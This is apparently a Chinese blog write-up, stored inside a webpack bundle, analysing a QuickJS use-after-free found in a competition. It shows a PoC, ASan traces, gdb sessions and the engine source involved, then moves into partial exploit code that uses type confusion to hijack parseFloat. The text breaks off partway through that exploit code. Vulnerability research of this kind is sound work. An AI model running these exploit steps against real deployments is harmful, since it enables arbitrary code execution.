(window.webpackJsonp=window.webpackJsonp||[]).push([[2],{302:function(a,e,t){a.exports=t.p+"assets/img/quickjs-1.baa24283.png"},303:function(a,e,t){a.exports=t.p+"assets/img/quickjs-2.d9855802.png"},304:function(a,e,t){a.exports=t.p+"assets/img/quickjs-3.a4c3e007.png"},305:function(a,e,t){a.exports=t.p+"assets/img/quickjs-4.5f35367f.png"},306:function(a,e,t){a.exports=t.p+"assets/img/quickjs-5.23a60188.png"},307:function(a,e,t){a.exports=t.p+"assets/img/quickjs-6.e5931a62.png"},308:function(a,e,t){a.exports=t.p+"assets/img/quickjs-7.6c705fef.png"},309:function(a,e,t){a.exports=t.p+"assets/img/quickjs-8.5853b1ed.png"},310:function(a,e,t){a.exports=t.p+"assets/img/quickjs-9.48a68d63.png"},363:function(a,e,t){"use strict";t.r(e);var n=[function(){var a=this,e=a.$createElement,n=a._self._c||e;return n("div",{staticClass:"content"},[n("p",[a._v("从twitter上看到了一个关于quickjs漏洞挖掘与漏洞利用的一次竞赛:http://rce.party/cracksbykim-quickJS.nfo")]),a._v(" "),n("p",[a._v("一共看到6个poc，3个代码审计、2个fuzzing、1个凭感觉..........，最后两个完成了exp，控制了eip/rip。")]),a._v(" "),n("p",[a._v("我试着分析了其中一个漏洞，并记录了整个过程。")]),a._v(" "),n("h2",{attrs:{id:"_0x1-poc"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_0x1-poc","aria-hidden":"true"}},[a._v("#")]),a._v(" 0x1 POC")]),a._v(" "),n("h3",{attrs:{id:"poc"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#poc","aria-hidden":"true"}},[a._v("#")]),a._v(" poc:")]),a._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[a._v("let spray = new Array(100);\nlet a = [{hack:0},1,2,3,4];\nlet refcopy = [a[0]];\na.__defineSetter__(3,()=>{throw 1;});\ntry {\n\ta.sort(function(v){if (v == a[0]) return 0; return 1;});\n}\ncatch (e){}\na[0] = 0;\nfor (let i=0; i<1000; i++) spray[i] = [13371337];\nconsole.log(refcopy[0]);\n")])])]),n("h3",{attrs:{id:"用addresssanitizer编译quickjs源码，根据addresssanitizer的结果来分析漏洞的触发过程。"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#用addresssanitizer编译quickjs源码，根据addresssanitizer的结果来分析漏洞的触发过程。","aria-hidden":"true"}},[a._v("#")]),a._v(" 用AddressSanitizer编译quickjs源码，根据AddressSanitizer的结果来分析漏洞的触发过程。")]),a._v(" "),n("h3",{attrs:{id:"addresssanitizer提示："}},[n("a",{staticClass:"header-anchor",attrs:{href:"#addresssanitizer提示：","aria-hidden":"true"}},[a._v("#")]),a._v(" AddressSanitizer提示：")]),a._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[a._v('==2368==ERROR: AddressSanitizer: heap-use-after-free on address 0x6070000091d0 at pc 0x0000005220c5 bp 0x7fffffff8ab0 sp 0x7fffffff8aa8\nREAD of size 4 at 0x6070000091d0 thread T0\n[New process 2372]\n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".\nprocess 2372 is executing new program: /usr/lib/llvm-6.0/bin/llvm-symbolizer\nError in re-setting breakpoint 1: No source file named quickjs.c.\n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".\n    #0 0x5220c4 in JS_DupValue /home/test/Desktop/quick/quickjs-2019-07-09-clang/./quickjs.h:579:21\n    #1 0x52ff47 in JS_GetPropertyValue /home/test/Desktop/quick/quickjs-2019-07-09-clang/quickjs.c:6909:20\n    #2 0x547cfe in JS_CallInternal /home/test/Desktop/quick/quickjs-2019-07-09-clang/quickjs.c:15825:23\n    #3 0x522411 in JS_CallFree /home/test/Desktop/quick/quickjs-2019-07-09-clang/quickjs.c:16768:19\n    #4 0x696fae in JS_EvalFunctionInternal /home/test/Desktop/quick/quickjs-2019-07-09-clang/quickjs.c:29671:19\n    #5 0x691639 in __JS_EvalInternal /home/test/Desktop/quick/quickjs-2019-07-09-clang/quickjs.c:29802:19\n    #6 0x59e8ab in JS_EvalInternal /home/test/Desktop/quick/quickjs-2019-07-09-clang/quickjs.c:29820:12\n    #7 0x6e3f34 in JS_Eval /home/test/Desktop/quick/quickjs-2019-07-09-clang/quickjs.c:29850:11\n    #8 0x517f0d in eval_buf /home/test/Desktop/quick/quickjs-2019-07-09-clang/qjs.c:57:11\n    #9 0x5181cd in eval_file /home/test/Desktop/quick/quickjs-2019-07-09-clang/qjs.c:79:11\n    #10 0x5176c9 in main /home/test/Desktop/quick/quickjs-2019-07-09-clang/qjs.c:418:17\n    #11 0x7ffff6e24b96 in __libc_start_main /build/glibc-OTsEL5/glibc-2.27/csu/../csu/libc-start.c:310\n    #12 0x41d909 in _start (/home/test/Desktop/quick/quickjs-2019-07-09-clang/qjs+0x41d909)\n\n0x6070000091d0 is located 0 bytes inside of 72-byte region [0x6070000091d0,0x607000009218)\nfreed by thread T0 here:\n    #0 0x4dd5f0 in __interceptor_free.localalias.0 (/home/test/Desktop/quick/quickjs-2019-07-09-clang/qjs+0x4dd5f0)\n    #1 0x66e865 in js_def_free /home/test/Desktop/quick/quickjs-2019-07-09-clang/quickjs.c:1312:5\n    #2 0x5212a5 in js_free_rt /home/test/Desktop/quick/quickjs-2019-07-09-clang/quickjs.c:1023:5\n    #3 0x5805fc in free_object2 /home/test/Desktop/quick/quickjs-2019-07-09-clang/quickjs.c:4828:9\n    #4 0x57fd6a in free_object /home/test/Desktop/quick/quickjs-2019-07-09-clang/quickjs.c:4836:9\n    #5 0x57fb7c in __JS_FreeValueRT /home/test/Desktop/quick/quickjs-2019-07-09-clang/quickjs.c:4871:9\n    #6 0x5a8d68 in __JS_FreeValue /home/test/Desktop/quick/quickjs-2019-07-09-clang/quickjs.c:4906:5\n    #7 0x51dbd8 in JS_FreeValue.66 /home/test/Desktop/quick/quickjs-2019-07-09-clang/./quickjs.h:560:13\n    #8 0x55df27 in set_value /home/test/Desktop/quick/quickjs-2019-07-09-clang/quickjs.c:1796:5\n    #9 0x562dc1 in JS_SetPropertyInternal /home/test/Desktop/quick/quickjs-2019-07-09-clang/quickjs.c:7467:13\n    #10 0x56d26c in JS_SetPropertyValue /home/test/Desktop/quick/quickjs-2019-07-09-clang/quickjs.c:7779:15\n    #11 0x548901 in JS_CallInternal /home/test/Desktop/quick/quickjs-2019-07-09-clang/quickjs.c:15888:23\n    #12 0x522411 in JS_CallFree /home/test/Desktop/quick/quickjs-2019-07-09-clang/quickjs.c:16768:19\n    #13 0x696fae in JS_EvalFunctionInternal /home/test/Desktop/quick/quickjs-2019-07-09-clang/quickjs.c:29671:19\n    #14 0x691639 in __JS_EvalInternal /home/test/Desktop/quick/quickjs-2019-07-09-clang/quickjs.c:29802:19\n    #15 0x59e8ab in JS_EvalInternal /home/test/Desktop/quick/quickjs-2019-07-09-clang/quickjs.c:29820:12\n    #16 0x6e3f34 in JS_Eval /home/test/Desktop/quick/quickjs-2019-07-09-clang/quickjs.c:29850:11\n    #17 0x517f0d in eval_buf /home/test/Desktop/quick/quickjs-2019-07-09-clang/qjs.c:57:11\n    #18 0x5181cd in eval_file /home/test/Desktop/quick/quickjs-2019-07-09-clang/qjs.c:79:11\n    #19 0x5176c9 in main /home/test/Desktop/quick/quickjs-2019-07-09-clang/qjs.c:418:17\n    #20 0x7ffff6e24b96 in __libc_start_main /build/glibc-OTsEL5/glibc-2.27/csu/../csu/libc-start.c:310\n\npreviously allocated by thread T0 here:\n    #0 0x4dd7c0 in malloc (/home/test/Desktop/quick/quickjs-2019-07-09-clang/qjs+0x4dd7c0)\n    #1 0x66e6f5 in js_def_malloc /home/test/Desktop/quick/quickjs-2019-07-09-clang/quickjs.c:1296:11\n    #2 0x52e301 in js_malloc_rt /home/test/Desktop/quick/quickjs-2019-07-09-clang/quickjs.c:1018:12\n    #3 0x52e164 in js_malloc /home/test/Desktop/quick/quickjs-2019-07-09-clang/quickjs.c:1058:11\n    #4 0x59fc5c in JS_NewObjectFromShape /home/test/Desktop/quick/quickjs-2019-07-09-clang/quickjs.c:4162:9\n    #5 0x51cfd1 in JS_NewObjectProtoClass /home/test/Desktop/quick/quickjs-2019-07-09-clang/quickjs.c:4274:12\n    #6 0x556f23 in JS_NewObject /home/test/Desktop/quick/quickjs-2019-07-09-clang/quickjs.c:4347:12\n    #7 0x538b02 in JS_CallInternal /home/test/Desktop/quick/quickjs-2019-07-09-clang/quickjs.c:14591:21\n    #8 0x522411 in JS_CallFree /home/test/Desktop/quick/quickjs-2019-07-09-clang/quickjs.c:16768:19\n    #9 0x696fae in JS_EvalFunctionInternal /home/test/Desktop/quick/quickjs-2019-07-09-clang/quickjs.c:29671:19\n    #10 0x691639 in __JS_EvalInternal /home/test/Desktop/quick/quickjs-2019-07-09-clang/quickjs.c:29802:19\n    #11 0x59e8ab in JS_EvalInternal /home/test/Desktop/quick/quickjs-2019-07-09-clang/quickjs.c:29820:12\n    #12 0x6e3f34 in JS_Eval /home/test/Desktop/quick/quickjs-2019-07-09-clang/quickjs.c:29850:11\n    #13 0x517f0d in eval_buf /home/test/Desktop/quick/quickjs-2019-07-09-clang/qjs.c:57:11\n    #14 0x5181cd in eval_file /home/test/Desktop/quick/quickjs-2019-07-09-clang/qjs.c:79:11\n    #15 0x5176c9 in main /home/test/Desktop/quick/quickjs-2019-07-09-clang/qjs.c:418:17\n    #16 0x7ffff6e24b96 in __libc_start_main /build/glibc-OTsEL5/glibc-2.27/csu/../csu/libc-start.c:310\n\n')])])]),n("h3",{attrs:{id:"有了addresssanitizer的帮助我们可以很清楚看到内存是在哪分配的、在哪释放的、在哪又重新引用了。"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#有了addresssanitizer的帮助我们可以很清楚看到内存是在哪分配的、在哪释放的、在哪又重新引用了。","aria-hidden":"true"}},[a._v("#")]),a._v(" 有了AddressSanitizer的帮助我们可以很清楚看到内存是在哪分配的、在哪释放的、在哪又重新引用了。")]),a._v(" "),n("h3",{attrs:{id:"使用内存"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#使用内存","aria-hidden":"true"}},[a._v("#")]),a._v(" 使用内存")]),a._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[a._v("577     if (JS_VALUE_HAS_REF_COUNT(v)) {\n578         JSRefCountHeader *p = JS_VALUE_GET_PTR(v);\n579         p->ref_count++;\n580     }\n")])])]),n("h3",{attrs:{id:"释放内存"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#释放内存","aria-hidden":"true"}},[a._v("#")]),a._v(" 释放内存")]),a._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[a._v("1796     JS_FreeValue(ctx, old_val);\n")])])]),n("h3",{attrs:{id:"分配内存"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#分配内存","aria-hidden":"true"}},[a._v("#")]),a._v(" 分配内存")]),a._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[a._v("14590         CASE(OP_object):\n14591             *sp++ = JS_NewObject(ctx);\n")])])]),n("h2",{attrs:{id:"_0x2-简单分析"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_0x2-简单分析","aria-hidden":"true"}},[a._v("#")]),a._v(" 0x2 简单分析")]),a._v(" "),n("h3",{attrs:{id:"有了上面的信息，我试着逐行运行poc文件，尝试去理解quickjs是怎么解析js语法的。"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#有了上面的信息，我试着逐行运行poc文件，尝试去理解quickjs是怎么解析js语法的。","aria-hidden":"true"}},[a._v("#")]),a._v(" 有了上面的信息，我试着逐行运行poc文件，尝试去理解quickjs是怎么解析js语法的。")]),a._v(" "),n("p",[a._v("let a = [1,2,3]  //创建数组")]),a._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[a._v("14855         CASE(OP_array_from):\n14856             {\n14857                 int i, ret;\n14858 \n14859                 call_argc = get_u16(pc);\n14860                 pc += 2;\n14861                 ret_val = JS_NewArray(ctx);\n14862                 if (unlikely(JS_IsException(ret_val)))\n14863                     goto exception;\n14864                 call_argv = sp - call_argc;\n14865                 for(i = 0; i < call_argc; i++) {\n14866                     ret = JS_DefinePropertyValue(ctx, ret_val, __JS_AtomFromUInt32(i), call_argv[i],\n14867                                                  JS_PROP_C_W_E | JS_PROP_THROW);\n14868                     call_argv[i] = JS_UNDEFINED;\n14869                     if (ret < 0) {\n14870                         JS_FreeValue(ctx, ret_val);\n14871                         goto exception;\n14872                     }\n14873                 }\n14874                 sp -= call_argc;\n14875                 *sp++ = ret_val;\n14876             }\n14877             BREAK;\n")])])]),n("p",[a._v("gdb 调试结果")]),a._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[a._v("gdb-peda$ p call_argc \n$2 = 0x3\n\n\ngdb-peda$ p call_argv\n$3 = (JSValue *) 0x7fffffff8fd0\n\ngdb-peda$ x /6xg 0x7fffffff8fd0\n0x7fffffff8fd0:\t0x0000000000000001\t0x0000000000000000\n0x7fffffff8fe0:\t0x0000000000000002\t0x0000000000000000\n0x7fffffff8ff0:\t0x0000000000000003\t0x0000000000000000\n")])])]),n("p",[a._v("let a = [{aa:1},0,1,2,3];   //创建object对象，然后创建数组，object引用次数为1")]),a._v(" "),n("p",[a._v("第一步 {aa:1}")]),a._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[a._v("14590         CASE(OP_object):\n14591             *sp++ = JS_NewObject(ctx);\n14592             if (unlikely(JS_IsException(sp[-1])))\n14593                 goto exception;\n14594             BREAK;\n")])])]),n("p",[a._v("第二步创建数组")]),a._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[a._v("gdb-peda$ p call_argc \n$1 = 0x5\ngdb-peda$ p call_argv \n$2 = (JSValue *) 0x7fffffff8fb0\ngdb-peda$ x /10xg 0x7fffffff8fb0\n0x7fffffff8fb0:\t0x00006070000091d0\t0xffffffffffffffff\n0x7fffffff8fc0:\t0x0000000000000000\t0x0000000000000000\n0x7fffffff8fd0:\t0x0000000000000001\t0x0000000000000000\n0x7fffffff8fe0:\t0x0000000000000002\t0x0000000000000000\n0x7fffffff8ff0:\t0x0000000000000003\t0x0000000000000000\n\n\n//0x00006070000091d0    object 对象地址\n\n//引用计数\ngdb-peda$ p *(JSRefCountHeader*)0x00006070000091d0\n$3 = {\n  ref_count = 0x1\n}\n\n//赋值的时候引用次数加1\n575 static inline JSValue JS_DupValue(JSContext *ctx, JSValueConst v)\n576 {\n577     if (JS_VALUE_HAS_REF_COUNT(v)) {\n578         JSRefCountHeader *p = JS_VALUE_GET_PTR(v);\n579         p->ref_count++;\n580     }\n581     return (JSValue)v;\n582 }\n\n//释放掉之前的 减1\n555 static inline void JS_FreeValue(JSContext *ctx, JSValue v)\n556 {\n557     if (JS_VALUE_HAS_REF_COUNT(v)) {\n558         JSRefCountHeader *p = JS_VALUE_GET_PTR(v);\n559         if (--p->ref_count <= 0) {\n560             __JS_FreeValue(ctx, v);\n561         }\n562     }\n563 }\n")])])]),n("p",[a._v("let a = [{aa:1},0,1,2,3];")]),a._v(" "),n("p",[a._v("let refcopy = [a[0]];         //创建另一个数组，object引用次数为2")]),a._v(" "),n("p",[a._v("//创建另一个数组 gdb调试信息")]),a._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[a._v("gdb-peda$ p call_argc \n$10 = 0x1\n\ngdb-peda$ p call_argv \n$9 = (JSValue *) 0x7fffffff8fb0\ngdb-peda$ x /4xg 0x7fffffff8fb0\n0x7fffffff8fb0:\t0x00006070000091d0\t0xffffffffffffffff\n0x7fffffff8fc0:\t0x0000000000000000\t0x0000000000000000\n\n\np *(JSRefCountHeader*)0x00006070000091d0\n$16 = {\n  ref_count = 0x2\n}\n")])])]),n("p",[a._v("let a = [{aa:1},0,1,2,3];")]),a._v(" "),n("p",[a._v("let refcopy = [a[0]];")]),a._v(" "),n("p",[a._v("a.__defineSetter__(3,()=>{throw 1;});    //设置数组属性值的方法，箭头函数，抛出异常")]),a._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[a._v("14837         CASE(OP_tail_call_method):\n14838             {\n14839                 call_argc = get_u16(pc);\n14840                 pc += 2;\n14841                 call_argv = sp - call_argc;\n14842                 sf->cur_pc = pc;\n14843                 ret_val = JS_CallInternal(ctx, call_argv[-1], call_argv[-2],\n14844                                           JS_UNDEFINED, call_argc, call_argv, 0);\n14845                 if (unlikely(JS_IsException(ret_val)))\n14846                     goto exception;\n14847                 if (opcode == OP_tail_call_method)\n14848                     goto done;\n14849                 for(i = -2; i < call_argc; i++)\n14850                     JS_FreeValue(ctx, call_argv[i]);\n14851                 sp -= call_argc + 2;\n14852                 *sp++ = ret_val;\n14853             }\n14854             BREAK;\n\n\n\n\n32081 /* magic = 1 if called as __defineSetter__ */\n32082 static JSValue js_object___defineGetter__(JSContext *ctx, JSValueConst this_val,\n32083                                           int argc, JSValueConst *argv, int magic)\n32084 {\n32085     JSValue obj;\n32086     JSValueConst prop, value, get, set;\n32087     int ret, flags;\n32088     JSAtom atom;\n32089 \n32090     prop = argv[0];\n32091     value = argv[1];\n32092 \n32093     obj = JS_ToObject(ctx, this_val);\n32094     if (JS_IsException(obj))\n32095         return JS_EXCEPTION;\n            ..........\n            ..........\n}\n\n\np *(JSRefCountHeader*)0x00006070000091d0\n$3 = {\n  ref_count = 0x2\n}\n")])])]),n("p",[a._v("let a = [{aa:1},0,1,2,3];")]),a._v(" "),n("p",[a._v("let refcopy = [a[0]];")]),a._v(" "),n("p",[a._v("a.__defineSetter__(3,()=>{throw 1;});")]),a._v(" "),n("p",[a._v("try {")]),a._v(" "),n("p",[a._v("a.sort(function(v){return 0;}); //调用js_array_sort函数，调用之前设置的函数，抛出异常。")]),a._v(" "),n("p",[a._v("}\ncatch (e){"),n("br"),a._v("\n//处理异常的时候，object引用次数减1")]),a._v(" "),n("p",[a._v("}")]),a._v(" "),n("p",[a._v("//调用js_array_sort")]),a._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[a._v("34645 static JSValue js_array_sort(JSContext *ctx, JSValueConst this_val,\n34646                              int argc, JSValueConst *argv)\n34647 {\n34648     struct array_sort_context asc = { ctx, 0, 0, argv[0] };\n34649     JSValue obj = JS_UNDEFINED;\n34650     ValueSlot *array = NULL;\n34651     size_t array_size = 0, pos = 0, n = 0;\n34652     int64_t i, len, undefined_count = 0;\n34653     int present;\n34654 \n34655     if (!JS_IsUndefined(asc.method)) {\n34656         if (check_function(ctx, asc.method))\n34657             goto exception;\n34658         asc.has_method = 1;\n34659     }\n34660     obj = JS_ToObject(ctx, this_val);\n34661     if (js_get_length64(ctx, &len, obj))\n34662         goto exception;\n\n\n\n34719 exception:\n34720     for (n = 0; n < pos; n++) {\n34721         JS_FreeValue(ctx, array[n].val);\n34722         if (array[n].str)\n34723             JS_FreeValue(ctx, JS_MKPTR(JS_TAG_STRING, array[n].str));\n34724     }\n34725     js_free(ctx, array);\n\n\n#0  js_array_sort (ctx=0x7fffffff49a0, this_val=<error reading variable: Cannot access memory at address 0x40>, argc=0x0, argv=0x7fffffff4ab0)\n    at quickjs.c:34647\n#1  0x0000000000553606 in js_call_c_function (ctx=0x614000000040, func_obj=..., this_obj=..., argc=0x1, argv=0x7fffffff8fd0, flags=0x0)\n    at quickjs.c:14236\n#2  0x000000000053642d in JS_CallInternal (ctx=0x614000000040, func_obj=..., this_obj=..., new_target=..., argc=0x1, argv=0x7fffffff8fd0, flags=0x0)\n    at quickjs.c:14430\n#3  0x000000000053ba6a in JS_CallInternal (ctx=0x614000000040, func_obj=..., this_obj=..., new_target=..., argc=0x0, argv=0x0, flags=0x2)\n    at quickjs.c:14843\n#4  0x0000000000522412 in JS_CallFree (ctx=0x614000000040, func_obj=..., this_obj=..., argc=0x0, argv=0x0) at quickjs.c:16768\n\n\n\nexception 的时候object引用次数减1\n\n此时0x00006070000091d0\n\ngdb-peda$ p *(JSRefCountHeader*)0x00006070000091d0\n$56 = {\n  ref_count = 0x1\n}\n")])])]),n("p",[a._v("let a = [{hack:0},1,2,3,4];")]),a._v(" "),n("p",[a._v("a[0] = 0;                       //重新为a[0]赋值，之前a[0]的值是一个object对象，判断引用次数，如果为0，则释放该对象。")]),a._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[a._v("创建数组\n\n第二步数组赋值\n15884         CASE(OP_put_array_el):\n15885             {\n15886                 int ret;\n15887 \n15888                 ret = JS_SetPropertyValue(ctx, sp[-3], sp[-2], sp[-1], JS_PROP_THROW_STRICT);\n15889                 JS_FreeValue(ctx, sp[-3]);\n15890                 sp -= 3;\n15891                 if (unlikely(ret < 0))\n15892                     goto exception;\n15893             }\n15894             BREAK;\n\n\n设置新值\n1791 static inline void set_value(JSContext *ctx, JSValue *pval, JSValue new_val)\n1792 {\n1793     JSValue old_val;\n1794     old_val = *pval;\n1795     *pval = new_val;\n1796     JS_FreeValue(ctx, old_val);\n1797 }\n\n之前的值判断引用计数\n555 static inline void JS_FreeValue(JSContext *ctx, JSValue v)\n556 {\n557     if (JS_VALUE_HAS_REF_COUNT(v)) {\n558         JSRefCountHeader *p = JS_VALUE_GET_PTR(v);\n559         if (--p->ref_count <= 0) {\n560             __JS_FreeValue(ctx, v);    \n561         }\n562     }\n563 }\n\n\ngdb-peda$ p *(JSRefCountHeader*)0x00006070000091d0\n$56 = {\n  ref_count = 0x0\n}\n")])])]),n("p",[a._v("let a = [{aa:1},0,1,2,3];")]),a._v(" "),n("p",[a._v("let refcopy = [a[0]];")]),a._v(" "),n("p",[a._v("a.__defineSetter__(3,()=>{throw 1;});")]),a._v(" "),n("p",[a._v("try {")]),a._v(" "),n("p",[a._v("a.sort(function(v){return 0;});")]),a._v(" "),n("p",[a._v("}\ncatch (e){\n}")]),a._v(" "),n("p",[a._v("a[0] = 1;                                         //同理上面")]),a._v(" "),n("p",[a._v("refcopy[0];                                       //最后heap use after free")]),a._v(" "),n("p",[a._v("while(1);")]),a._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[a._v("//取数组值\n15821         CASE(OP_get_array_el):\n15822             {\n15823                 JSValue val;\n15824 \n15825                 val = JS_GetPropertyValue(ctx, sp[-2], sp[-1]);\n15826                 JS_FreeValue(ctx, sp[-2]);\n15827                 sp[-2] = val;\n15828                 sp--;\n15829                 if (unlikely(JS_IsException(val)))\n15830                     goto exception;\n15831             }\n15832             BREAK;\n\n//使用内存\n575 static inline JSValue JS_DupValue(JSContext *ctx, JSValueConst v)\n576 {\n577     if (JS_VALUE_HAS_REF_COUNT(v)) {\n578         JSRefCountHeader *p = JS_VALUE_GET_PTR(v);\n579         p->ref_count++;\n580     }\n581     return (JSValue)v;\n582 }\n\n")])])]),n("h2",{attrs:{id:"_0x3-利用"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_0x3-利用","aria-hidden":"true"}},[a._v("#")]),a._v(" 0x3 利用")]),a._v(" "),n("p",[a._v("利用exp见文章末尾。")]),a._v(" "),n("p",[a._v("漏洞利用最终实现的是，任意地址泄漏，得到parseFloat函数地址，利用任意地址写任意内容，覆盖parseFloat函数地址跳到我们的可控地址。")]),a._v(" "),n("h3",{attrs:{id:"_3-1"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_3-1","aria-hidden":"true"}},[a._v("#")]),a._v(" 3.1")]),a._v(" "),n("h3",{attrs:{id:"调用parsefloat函数的过程"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#调用parsefloat函数的过程","aria-hidden":"true"}},[a._v("#")]),a._v(" 调用parseFloat函数的过程")]),a._v(" "),n("p",[a._v("parseFloat();")]),a._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[a._v("RAX  0x46f680 (js_parseFloat) ◂— push   rbp\nRIP  0x416e2b (js_call_c_function+603) ◂— call   rax\n──────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────\n ► 0x416e2b <js_call_c_function+603>    call   rax <0x46f680>\n───────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]───────────────────────────────────────────────────────────────────\nIn file: /home/test/Desktop/quick/quickjs-2019-07-09xx/quickjs.c\n   14231             }\n   14232         }\n   14233         /* here this_obj is new_target */\n   14234         /* fall thru */\n   14235     case JS_CFUNC_generic:\n ► 14236         ret_val = func.generic(ctx, this_obj, argc, arg_buf);\n   14237         break;\n")])])]),n("h3",{attrs:{id:"_3-2"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_3-2","aria-hidden":"true"}},[a._v("#")]),a._v(" 3.2")]),a._v(" "),n("h3",{attrs:{id:"几个关键的结构体"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#几个关键的结构体","aria-hidden":"true"}},[a._v("#")]),a._v(" 几个关键的结构体")]),a._v(" "),n("p",[a._v("JSObject")]),a._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[a._v("  667 struct JSObject {\n  668     JSRefCountHeader header; /* must come first, 32-bit */\n  669     JSGCHeader gc_header; /* must come after JSRefCountHeader, 8-bit */\n  670     uint8_t extensible : 1;\n  671     uint8_t free_mark : 1; /* only used when freeing objects with cycles */\n  672     uint8_t is_exotic : 1; /* TRUE if object has exotic property handlers */\n  673     uint8_t fast_array : 1; /* TRUE if u.array is used for get/put */\n  674     uint8_t is_constructor : 1; /* TRUE if object is a constructor function */\n  675     uint8_t is_uncatchable_error : 1; /* if TRUE, error is not catchable */\n  676     uint8_t is_class : 1; /* TRUE if object is a class constructor */\n  677     uint8_t tmp_mark : 1; /* used in JS_WriteObjectRec() */\n  678     uint16_t class_id; /* see JS_CLASS_x */\n  679     /* byte offsets: 8/8 */\n  680     struct list_head link; /* object list */\n  681     /* byte offsets: 16/24 */\n  682     JSShape *shape; /* prototype and property names + flag */\n  683     JSProperty *prop; /* array of properties */\n  684     /* byte offsets: 24/40 */\n  685     struct JSMapRecord *first_weak_ref; /* XXX: use a bit and an external hash table? */\n  686     /* byte offsets: 28/48 */\n  687     union {\n                ....\n                ....\n                ...\n          }\n")])])]),n("p",[a._v("JSString")]),a._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[a._v("  384 struct JSString {\n  385     JSRefCountHeader header; /* must come first, 32-bit */\n  386     uint32_t len : 31;\n  387     uint8_t is_wide_char : 1; /* 0 = 8 bits, 1 = 16 bits characters */\n  388     uint32_t hash : 30;\n  389     uint8_t atom_type : 2; /* != 0 if atom, JS_ATOM_TYPE_x */\n  390     uint32_t hash_next; /* atom_index for JS_ATOM_TYPE_SYMBOL */\n  391 #ifdef DUMP_LEAKS\n  392     struct list_head link; /* string list */\n  393 #endif\n  394     union {\n  395         uint8_t str8[0]; /* 8 bit strings will get an extra null terminator */\n  396         uint16_t str16[0];\n  397     } u;\n  398 };\n\n")])])]),n("p",[a._v("JSArrayBuffer")]),a._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[a._v("  516 typedef struct JSArrayBuffer {\n  517     int byte_length; /* 0 if detached */\n  518     uint8_t detached;\n  519     uint8_t shared; /* if shared, the array buffer cannot be detached */\n  520     uint8_t *data; /* NULL if detached */\n  521     struct list_head array_list;\n  522     void *opaque;\n  523     JSFreeArrayBufferDataFunc *free_func;\n  524 } JSArrayBuffer;\n")])])]),n("h3",{attrs:{id:"_3-3"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_3-3","aria-hidden":"true"}},[a._v("#")]),a._v(" 3.3")]),a._v(" "),n("h3",{attrs:{id:"漏洞利用，造成类型混淆"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞利用，造成类型混淆","aria-hidden":"true"}},[a._v("#")]),a._v(" 漏洞利用，造成类型混淆")]),a._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[a._v("//触发漏洞，和poc一样。\n\na = [\n    [0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n    ....\n    ....          //内存要足够大\n    ], 1, 2, 3, 4\n];\n\nrefcopy = a[0];\n\na.__defineSetter__(3, function () {\n    throw 1;\n});\ntry {\n    a.sort(function (v) {\n        return 0;\n    });\n} catch (e) {}\n\n//根据引用计数，释放掉之前的a[0]内存。此时内存类型为JSObject。\na[0] = 0x61616161;\n\n//释放掉a[0]之后，重新分配JSString类型的内存。\nrefill_0 = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'.slice(1);\n\n//释放刚刚申请的JSString类型的内存。\nrefcopy = 0;\n\n//申请一块新的内存，类型大小和a[0]一致，此时refill_1和refill_0指向同一块内存。\nrefill_1 = [0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,      //和a[0]一样\n          ...\n          